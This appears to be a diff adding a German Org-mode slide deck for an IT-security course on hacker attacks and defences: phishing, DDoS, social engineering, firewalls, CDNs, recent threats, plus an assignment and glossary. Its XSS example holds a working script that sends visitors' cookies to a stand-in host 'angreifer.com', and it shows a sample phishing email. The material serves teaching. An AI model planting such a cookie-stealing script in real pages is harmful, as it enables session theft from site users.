@@ -1,0 +1,463 @@
+:LaTeX_PROPERTIES:
+#+LANGUAGE: de
+#+OPTIONS: d:nil todo:nil pri:nil tags:nil
+#+OPTIONS: H:4
+#+LaTeX_CLASS: orgstandard
+#+LaTeX_CMD: xelatex
+#+LATEX_HEADER: \usepackage{listings}
+:END:
+
+
+:REVEAL_PROPERTIES:
+#+REVEAL_ROOT: https://cdn.jsdelivr.net/npm/reveal.js
+#+REVEAL_REVEAL_JS_VERSION: 4
+#+REVEAL_THEME: league
+#+REVEAL_EXTRA_CSS: ./mystyle.css
+#+REVEAL_HLEVEL: 1
+#+OPTIONS: timestamp:nil toc:nil num:nil
+:END:
+
+#+TITLE: Hackerangriffe und Schutzmaßnahmen
+#+SUBTITLE: IT-Sicherheit
+#+AUTHOR: ITT-Net-IS
+
+#+LATEX: \def\square{\text{☐}}\relax\def\boxtimes{\text{☑}}\relax 
+
+* Einführung
+"Hackerangriff" bezeichnet einen Versuch, unbefugten Zugriff auf ein Computersystem, Netzwerk oder Daten zu erlangen. Während der Begriff "Hacker" ursprünglich Personen mit tiefgreifendem Technikverständnis beschrieb, wird er heute oft mit Cyberkriminellen assoziiert.
+
+
+* Arten von Hackerangriffen
+** Phishing-Angriffe
+Phishing zielt darauf ab, vertrauliche Informationen wie Passwörter oder Kreditkartendaten durch Täuschung zu erlangen.
+
+#+BEGIN_NOTES
+"Phishing" kommt vom englischen "fishing" (Angeln) und bezeichnet den Versuch, Informationen "zu angeln", indem gefälschte Identitäten oder Websites verwendet werden.
+#+END_NOTES
+
+*** Phishing-Varianten
+#+ATTR_REVEAL: :frag (appear)
+- *Spear-Phishing*: Zielt auf bestimmte Personen oder Organisationen ab
+- *Whaling*: Spezifisch auf hochrangige Führungskräfte ausgerichtet
+- *Smishing*: Phishing über SMS
+- *Vishing*: Phishing über Telefonanrufe (Voice-Phishing)
+
+*** Beispiel: Typische Phishing-E-Mail
+#+BEGIN_EXAMPLE
+Von: security@bank-service-verify.com
+Betreff: Dringende Sicherheitswarnung - Handlung erforderlich
+
+Sehr geehrter Kunde,
+
+Wir haben ungewöhnliche Aktivitäten auf Ihrem Konto festgestellt. 
+Um eine Sperrung zu verhindern, bestätigen Sie bitte Ihre Identität unter:
+https://bank-verfication-secure.com/login
+
+Mit freundlichen Grüßen,
+Ihr Sicherheitsteam
+#+END_EXAMPLE
+
+** DDoS-Angriffe (Distributed Denial of Service)
+DDoS-Angriffe überlasten Systeme oder Netzwerke mit Anfragen, bis sie nicht mehr reagieren können.
+
+#+BEGIN_NOTES
+"DDoS" steht für "Distributed Denial of Service". Der Angriff wird von vielen verschiedenen Quellen gleichzeitig ausgeführt, was ihn schwer zu blockieren macht.
+#+END_NOTES
+
+*** DDoS-Arten
+#+ATTR_REVEAL: :frag (appear)
+- *Volumetrische Angriffe*: Überschwemmen Netzwerkbandbreite
+- *Protokollangriffe*: Ausnutzen von Schwachstellen in Netzwerkprotokollen
+- *Anwendungsangriffe*: Zielen auf spezifische Anwendungen oder Dienste ab
+
+** Social Engineering
+Bei Social Engineering werden psychologische Manipulation eingesetzt, um Opfer zur Preisgabe vertraulicher Informationen zu bewegen.
+
+#+BEGIN_NOTES
+"Social Engineering" bezeichnet Techniken der zwischenmenschlichen Manipulation, um Menschen dazu zu bringen, normale Sicherheitsmaßnahmen zu umgehen.
+#+END_NOTES
+
+*** Häufige Social Engineering-Taktiken
+#+ATTR_REVEAL: :frag (appear)
+- *Vorwand-Anrufe* ("Pretexting"): Erfundene Szenarien zur Informationsgewinnung
+- *Baiting*: Anbieten von etwas Verlockenden (z.B. kostenlose Downloads), um Schadsoftware zu verbreiten
+- *Quid Pro Quo*: Versprechen eines Vorteils im Austausch für Informationen
+- *Tailgating*: Unbefugtes Folgen einer autorisierten Person in gesicherte Bereiche
+
+** Andere verbreitete Angriffsarten
+#+ATTR_REVEAL: :frag (appear)
+- *SQL-Injection*: Einschleusen von schädlichem SQL-Code in Datenbankanfragen
+- *Cross-Site Scripting (XSS)*: Einbetten bösartiger Skripte in Webseiten
+- *Man-in-the-Middle (MITM)*: Abfangen und möglicherweise Manipulieren von Kommunikation
+- *Brute-Force*: Systematisches Durchprobieren aller möglichen Passwörter
+- *Zero-Day-Exploits*: Ausnutzen unbekannter Sicherheitslücken
+
+
+*** Beispiel: Cross-Site Scripting (XSS)
+#+BEGIN_SRC html
+<!-- Böswilliger Kommentar auf einer Website -->
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    var img = new Image();
+    img.src = 'https://angreifer.com/stehlen?cookies=' + encodeURIComponent(document.cookie);
+    img.style.display = 'none';
+    document.body.appendChild(img);
+  });
+</script>
+#+END_SRC
+
+* Schutzmaßnahmen gegen Hackerangriffe
+** Technische Schutzmaßnahmen
+*** Firewalls und Netzwerksicherheit
+#+ATTR_REVEAL: :frag (appear)
+- Implementierung und Konfiguration von Firewalls
+- Segmentierung von Netzwerken
+- Verwendung von Virtual Private Networks (VPNs)
+- Regelmäßige Netzwerküberwachung
+
+#+BEGIN_NOTES
+Eine "Firewall" ist ein Sicherheitssystem, das den Netzwerkverkehr basierend auf vordefinierten Sicherheitsregeln überwacht und kontrolliert.
+#+END_NOTES
+
+*** Beispiel: Einfache iptables-Firewall-Konfiguration
+#+BEGIN_SRC bash
+  # Grundlegende iptables-Firewall-Regeln
+  
+  # Standardrichtlinien: Alles ablehnen
+  iptables -P INPUT DROP
+  iptables -P FORWARD DROP
+  iptables -P OUTPUT ACCEPT
+  
+  # Lokale Verbindungen erlauben
+  iptables -A INPUT -i lo -j ACCEPT
+  
+  # Bestehende Verbindungen erlauben
+  iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+  
+  # SSH auf Port 22 erlauben
+  iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+  
+  # HTTP und HTTPS erlauben
+  iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+  iptables -A INPUT -p tcp --dport 443 -j ACCEPT
+#+END_SRC
+
+*** Aktualisierte Software und Patch-Management
+#+ATTR_REVEAL: :frag (appear)
+- Regelmäßige Updates für Betriebssysteme und Software
+- Automatisierte Patch-Management-Systeme
+- Zeitnahe Anwendung sicherheitsrelevanter Updates
+
+*** Starke Authentifizierung
+#+ATTR_REVEAL: :frag (appear)
+- Verwendung komplexer Passwörter
+- Implementierung von Zwei-Faktor-Authentifizierung (2FA)
+- Biometrische Authentifizierungsmethoden
+- Single Sign-On (SSO) mit starker Basisauthentifizierung
+
+#+BEGIN_NOTES
+"Zwei-Faktor-Authentifizierung (2FA)" erfordert zwei unterschiedliche Authentifizierungsfaktoren: etwas, das man weiß (Passwort), besitzt (Smartphone) oder ist (Fingerabdruck).
+#+END_NOTES
+
+
+*** Verschlüsselung
+#+ATTR_REVEAL: :frag (appear)
+- Festplattenverschlüsselung
+- Verschlüsselung der Kommunikation (TLS/SSL)
+- E-Mail-Verschlüsselung (PGP/GPG)
+- Verschlüsselung von Backups
+
+*** Regelmäßige Backups
+#+ATTR_REVEAL: :frag (appear)
+- 3-2-1-Backup-Strategie: 3 Kopien, 2 verschiedene Medien, 1 Off-Site
+- Regelmäßige Tests der Wiederherstellungsprozesse
+- Unveränderliche (immutable) Backups gegen Ransomware
+
+** Organisatorische Schutzmaßnahmen
+*** Sicherheitsrichtlinien und -verfahren
+#+ATTR_REVEAL: :frag (appear)
+- Dokumentierte Sicherheitsrichtlinien
+- Klare Verantwortlichkeiten und Rollen
+- Incident-Response-Pläne
+- Regelmäßige Sicherheitsaudits
+
+#+BEGIN_NOTES
+"Incident-Response-Plan" ist ein dokumentierter Ablaufplan, der festlegt, wie eine Organisation auf Sicherheitsvorfälle reagieren soll.
+#+END_NOTES
+
+*** Mitarbeiterschulung und Sensibilisierung
+#+ATTR_REVEAL: :frag (appear)
+- Regelmäßige Sicherheitsschulungen
+- Phishing-Simulationen
+- Sicherheitsbewusstsein im Arbeitsalltag fördern
+- Klare Meldewege für verdächtige Aktivitäten
+
+*** Beispiel: Checkliste für Sicherheitsbewusstsein
+
+#+ATTR_REVEAL: :frag (appear)
+ - [ ] Verdächtige E-Mails an IT-Sicherheit melden
+ - [ ] Keine unbekannten USB-Sticks verwenden
+ - [ ] Starke, einzigartige Passwörter für jeden Dienst nutzen
+ - [ ] Zwei-Faktor-Authentifizierung aktivieren
+ - [ ] Öffentliches WLAN nur mit VPN nutzen
+ - [ ] Bildschirm sperren, wenn Arbeitsplatz verlassen wird
+ - [ ] Regelmäßig an Sicherheitsschulungen teilnehmen
+ - [ ] Vorsicht bei unerwarteten Anhängen oder Links
+
+
+*** Zugriffskontrollen und Berechtigungsverwaltung
+EXAMPLE
+- Prinzip der geringsten Berechtigung
+- Regelmäßige Überprüfung von Zugriffsrechten
+- Prozesse für Onboarding und Offboarding von Mitarbeitern
+- Privilegierte Konten besonders schützen
+
+#+BEGIN_NOTES
+Das "Prinzip der geringsten Berechtigung" (Principle of Least Privilege) besagt, dass Benutzer nur die minimal notwendigen Rechte erhalten sollten, um ihre Aufgaben zu erfüllen.
+#+END_NOTES
+
+** Überwachung und Reaktion
+*** Sicherheitsüberwachung
+EXAMPLE
+- Intrusion Detection/Prevention Systeme (IDS/IPS)
+- Security Information and Event Management (SIEM)
+- Anomalieerkennung
+- Honeypots zur Angriffserkennung
+
+#+BEGIN_NOTES
+"SIEM" (Security Information and Event Management) sammelt und analysiert Sicherheitsdaten aus verschiedenen Quellen, um Bedrohungen zu erkennen und darauf zu reagieren.
+#+END_NOTES
+
+*** Beispiel: Log-Analyse mit ELK Stack
+#+BEGIN_SRC bash
+  # Beispiel für einfache Analyse von Zugriffsprotokollen mit grep
+  # Suche nach fehlgeschlagenen SSH-Anmeldeversuchen
+  
+  grep "Failed password" /var/log/auth.log | \
+      awk '{print $11}' | \
+      sort | uniq -c | sort -nr | \
+      head -n 10
+#+END_SRC
+
+*** Incident Response
+#+ATTR_REVEAL: :frag (appear)
+- Festgelegte Reaktionspläne für verschiedene Angriffsszenarien
+- Klar definierte Rollen und Verantwortlichkeiten
+- Kommunikationsstrategien während eines Vorfalls
+- Forensische Untersuchungsprozesse
+
+*** Penetrationstests und Schwachstellenscans
+#+ATTR_REVEAL: :frag (appear)
+- Regelmäßige Schwachstellenscans
+- Externe Penetrationstests
+- Red-Team-Übungen
+- Bug-Bounty-Programme
+
+#+BEGIN_NOTES
+"Red-Team-Übungen" sind simulierte Angriffe durch ein Team von Sicherheitsexperten, die versuchen, die Verteidigungsmaßnahmen einer Organisation zu überwinden, um Schwachstellen zu identifizieren.
+#+END_NOTES
+
+
+** Content Delivery Networks (CDN) als Schutzmaßnahme
+Content Delivery Networks sind verteilte Netzwerke von Servern, die Website-Inhalte an verschiedenen geografischen Standorten zwischenspeichern und ausliefern.
+
+#+BEGIN_NOTES
+"CDN" steht für "Content Delivery Network" und bezeichnet ein Netzwerk geografisch verteilter Server, die zusammenarbeiten, um digitale Inhalte schnell und zuverlässig bereitzustellen. Ursprünglich zur Leistungsverbesserung entwickelt, haben CDNs heute wichtige Sicherheitsfunktionen.
+#+END_NOTES
+
+*** Funktionsweise eines CDN
+#+ATTR_REVEAL: :frag (appear)
+- Verteilung von Inhalten auf mehrere Server weltweit
+- Auslieferung von Inhalten vom geografisch nächsten Server
+- Zwischenspeicherung (Caching) statischer Inhalte
+- Lastverteilung zwischen Servern
+- Netzwerkoptimierung durch effiziente Routing-Mechanismen
+
+*** CDN als DDoS-Schutz
+CDNs bieten mehrere Schutzmechanismen gegen DDoS-Angriffe:
+
+**** Angriffsverdünnung durch Verteilung
+#+ATTR_REVEAL: :frag (appear)
+- Verteilung des Datenverkehrs auf zahlreiche Server weltweit
+- Einzelne Server werden nicht überlastet
+- Angriffsdaten werden über ein größeres Netzwerk verteilt
+
+**** Traffic-Filterung und Anomalieerkennung
+#+ATTR_REVEAL: :frag (appear)
+- Erkennung ungewöhnlicher Verkehrsmuster in Echtzeit
+- Unterscheidung zwischen legitimen Benutzern und Angreifern
+- Automatische Blockierung verdächtiger IP-Adressen
+- Layer 3/4 und Layer 7 Schutz (Netzwerk- und Anwendungsebene)
+
+**** Überkapazität und Skalierung
+#+ATTR_REVEAL: :frag (appear)
+- CDNs verfügen über massive Bandbreitenreserven
+- Können plötzliche Verkehrsspitzen absorbieren
+- Dynamische Skalierung bei Bedarf
+
+**** Bot-Management
+#+ATTR_REVEAL: :frag (appear)
+- Identifizierung und Blockierung von Bot-Netzwerken
+- CAPTCHA-Integration für verdächtige Anfragen
+- Rate-Limiting für einzelne IP-Adressen
+
+*** Beispiel: CDN-Konfiguration mit Cloudflare
+#+BEGIN_SRC yaml
+  # Beispiel einer Cloudflare-Konfiguration (als .cloudflare.yaml)
+  
+  # DDoS-Schutzeinstellungen
+  ddos_protection:
+    security_level: high      # Sicherheitsstufe (low, medium, high)
+    challenge_ttl: 3600       # Gültigkeitsdauer von Sicherheitsabfragen in Sekunden
+    rate_limiting:
+      enabled: true
+      threshold: 100          # Maximale Anfragen pro Minute
+      action: challenge       # Aktion bei Überschreitung (challenge, block, js_challenge)
+  
+  # WAF (Web Application Firewall) Regeln
+  waf:
+    enabled: true
+    ruleset: cloudflare      # Verwendetes Regelset
+    custom_rules:
+      - description: "Blockiere verdächtige User-Agents"
+        expression: "http.user_agent contains 'scraper' or http.user_agent contains 'bot'"
+        action: block
+  
+  # Caching-Einstellungen
+  cache:
+    enabled: true
+    ttl: 86400               # Caching-Dauer in Sekunden (24 Stunden)
+    browser_ttl: 14400       # Browser-Cache-Dauer (4 Stunden)
+#+END_SRC
+
+*** Vor- und Nachteile von CDNs
+**** Vorteile
+#+ATTR_REVEAL: :frag (appear)
+- Effektiver Schutz gegen volumetrische DDoS-Angriffe
+- Verbesserung der Website-Ladezeiten
+- Reduzierung der Last auf Ursprungsservern
+- Globale Verteilung für Ausfallsicherheit
+
+**** Nachteile
+#+ATTR_REVEAL: :frag (appear)
+- Potenzielle Abhängigkeit von einem externen Dienstleister
+- Mögliche Komplexität bei der Konfiguration
+- Zusätzliche Kosten bei hohem Datenverkehr
+- Bei unsachgemäßer Konfiguration mögliche Datenschutzprobleme
+
+*** Einsatzstrategien für CDNs
+#+ATTR_REVEAL: :frag (appear)
+- Kombination mit lokalen Schutzmaßnahmen (Defense-in-Depth)
+- Absicherung kritischer Webanwendungen und APIs
+- Entwicklung von Notfallplänen für den Fall einer CDN-Störung
+- Regelmäßige Überprüfung und Anpassung der CDN-Konfiguration
+
+#+BEGIN_NOTES
+Die Nutzung eines CDN ist eine proaktive Maßnahme, die sowohl die Leistung als auch die Sicherheit einer Website verbessert. Als Teil einer umfassenden Sicherheitsstrategie sollte ein CDN mit anderen Sicherheitsmaßnahmen wie Firewalls, Intrusion Detection und regelmäßigen Sicherheitsaudits kombiniert werden.
+#+END_NOTES
+
+* Aktuelle Angriffsszenarien (2024-2025)
+** Erweiterte Phishing-Techniken
+#+ATTR_REVEAL: :frag (appear)
+- KI-generierte Phishing-Nachrichten
+- Gezielte Spear-Phishing-Angriffe mit präzisen persönlichen Informationen
+- Manipulation von Geschäftskommunikation (Business Email Compromise)
+- Mehrsprachige und kulturell angepasste Phishing-Kampagnen
+
+** Cloud-Sicherheitsbedrohungen
+#+ATTR_REVEAL: :frag (appear)
+- Fehlkonfigurationen in Cloud-Umgebungen
+- Angriffe auf APIs
+- Container-Sicherheitslücken
+- Identity and Access Management (IAM) Schwachstellen
+
+** Angriffe auf Lieferketten
+#+ATTR_REVEAL: :frag (appear)
+- Kompromittierung von Software-Lieferketten
+- Angriffe auf vertrauenswürdige Software-Updates
+- Manipulation von Open-Source-Paketen
+- Kompromittierung von Entwicklungsumgebungen
+
+#+BEGIN_NOTES
+"Lieferkettenangriffe" zielen auf die Kompromittierung von Software oder Hardware während des Entwicklungs- oder Verteilungsprozesses ab, oft bevor sie den Endverbraucher erreicht.
+#+END_NOTES
+
+** IoT-Bedrohungen
+- Angriffe auf unzureichend gesicherte IoT-Geräte
+- Botnets aus kompromittierten IoT-Geräten
+- Smart-Home-Schwachstellen
+- Industrielle IoT-Sicherheitsprobleme
+
+#+BEGIN_NOTES
+"IoT" (Internet of Things) bezeichnet Alltagsgeräte, die mit dem Internet verbunden sind und Daten sammeln, austauschen und verarbeiten können.
+#+END_NOTES
+
+** Deepfakes und KI-gestützte Angriffe
+#+ATTR_REVEAL: :frag (appear)
+- Täuschend echte Stimm- und Videomanipulationen
+- Automatisierte Social-Engineering-Angriffe
+- Umgehung von biometrischen Sicherheitssystemen
+- Generative KI zur Erstellung täuschend echter Phishing-Inhalte
+
+*** Beispiel: Deepfake-basierte CEO-Betrugsmasche
+#+BEGIN_EXAMPLE
+Ein Finanzmanager erhält einen Videoanruf, der scheinbar vom CEO des Unternehmens kommt. 
+Die Person sieht aus und klingt genau wie der CEO, ist jedoch ein Deepfake.
+
+Der falsche CEO erklärt, dass eine dringende, vertrauliche Übernahme im Gange sei und 
+sofort eine Vorauszahlung an ein Treuhandkonto geleistet werden müsse. 
+Er betont die Dringlichkeit und Vertraulichkeit, um den normalen Genehmigungsprozess 
+zu umgehen.
+#+END_EXAMPLE
+
+* Praxisaufgabe: Recherche aktueller Angriffsszenarien            :noexports:
+:PROPERTIES:
+:Abgabetermin: 2025-04-24
+:Punkte: 25
+:END:
+
+** Aufgabenstellung
+1. Recherchieren Sie ein aktuelles Angriffsszenario aus den Jahren 2024-2025
+2. Analysieren Sie:
+   - Art des Angriffs
+   - Betroffene Systeme und Organisationen
+   - Angriffsmethode und -verlauf
+   - Auswirkungen und Schäden
+   - Gegenmaßnahmen und Lehren
+3. Erstellen Sie eine Präsentation (10-15 Minuten)
+4. Bereiten Sie praktische Empfehlungen vor, wie sich Unternehmen vor ähnlichen Angriffen schützen können
+
+** Bewertungskriterien
+- Tiefe und Qualität der Recherche (10 Punkte)
+- Verständnis der technischen Details (5 Punkte)
+- Qualität der Präsentation (5 Punkte)
+- Praxisrelevanz der Empfehlungen (5 Punkte)
+
+* Literatur und weiterführende Ressourcen                         :noexports:
+** Bücher
+- Ross J. Anderson: "Security Engineering" (3. Auflage, 2020)
+- Kim Zetter: "Countdown to Zero Day" (2015)
+- Bruce Schneier: "Click Here to Kill Everybody" (2018)
+
+** Online-Ressourcen
+- OWASP Top 10: https://owasp.org/Top10/
+- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
+- BSI IT-Grundschutz: https://www.bsi.bund.de/grundschutz
+
+** Podcasts und Blogs
+- Darknet Diaries (Podcast)
+- Passwort Podcast von Heise (Podcast)
+- Risky Buisness (Podcast)
+- Krebs on Security (Blog)
+- The Hacker News (Website)
+- heise Security (deutschsprachiges Portal)
+
+* Glossar                                                         :noexports:
+- *APT (Advanced Persistent Threat)*: Komplexe, langfristige Angriffe, oft staatlich gesponsert
+- *CVE (Common Vulnerabilities and Exposures)*: Standardisierte Kennungen für bekannte Sicherheitslücken
+- *Exploit*: Code oder Technik zur Ausnutzung einer Sicherheitslücke
+- *Hashing*: Kryptografische Einwegfunktion zur Datenintegritätsprüfung
+- *MITM (Man-in-the-Middle)*: Angriff, bei dem Kommunikation abgefangen wird
+- *Pen-Test (Penetrationstest)*: Autorisierter Simulationsangriff zur Sicherheitsprüfung
+- *Sandbox*: Isolierte Umgebung zum Testen potenziell gefährlicher Software
+- *Zero-Day*: Unbekannte Sicherheitslücke ohne verfügbaren Patch
